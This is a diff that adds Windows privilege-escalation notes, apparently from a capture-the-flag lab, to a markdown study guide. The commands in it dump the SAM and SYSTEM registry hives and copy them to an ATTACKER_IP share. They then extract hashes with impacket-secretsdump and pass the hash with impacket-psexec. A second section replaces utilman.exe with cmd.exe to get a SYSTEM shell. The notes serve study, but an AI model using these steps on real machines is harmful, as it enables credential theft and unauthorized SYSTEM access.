@@ -124,3 +124,59 @@ From this behaviour, the problem becomes evident. If an attacker creates any of 
 
 Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
 To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.
+
+## SeBackup /SeRestore
+
+Those privileges allow users to read an write to any file in the system, ignoring any DACL (Discretionary Access Control Lists).
+
+To backup the SAM and SYSTEM hashes, we can use the following commands:
+
+```shell-session
+C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
+C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+```
+
+Then we can create a new smbserver on our computer and create a share. After this, we can use the copy command in our windows machine to transfer both files to our kali computer.
+
+```shell
+ copy C:\Users\sam.hive \\ATTACKER_IP\public\
+```
+
+Then use impacket-secretsdump to retrieve the users password  hashes:
+
+```shell
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges.
+```shell
+impacket-psexec -hashes <hash> administrator@<win-machine-ip>
+```
+
+SeTakeOwnerShip
+This privilege allows a user to take ownership of any object on the system, including files and registry keys.
+
+We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like.
+
+To replace utilman, we will start by taking ownership of it with the following command:
+
+
+```shell
+C:\> takeown /f C:\Windows\System32\Utilman.exe
+```
+To give your user full permissions over utilman.exe you can use the following command:
+
+```shell
+icacls C:\Windows\System32\Utilman.exe /grant <user>:F
+```
+After this, we will replace utilman.exe with a copy of cmd.exe:
+
+```shell
+C:\Windows\System32\> copy cmd.exe utilman.exe
+```
+o trigger utilman, we will lock our screen from the start button.
+
+And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges.
